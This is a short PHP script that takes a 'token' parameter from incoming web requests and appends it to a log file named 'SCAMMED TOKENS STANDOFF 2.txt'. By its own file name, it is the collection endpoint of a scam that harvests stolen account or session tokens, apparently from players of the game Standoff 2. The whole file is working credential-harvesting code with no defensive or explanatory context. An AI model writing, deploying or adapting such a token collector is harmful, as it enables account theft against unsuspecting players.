<?php
 
$token = $_GET['token'];
 
$file = fopen('SCAMMED TOKENS STANDOFF 2.txt', 'a');
fwrite($file, $token . PHP_EOL);
fclose($file);
 
?>
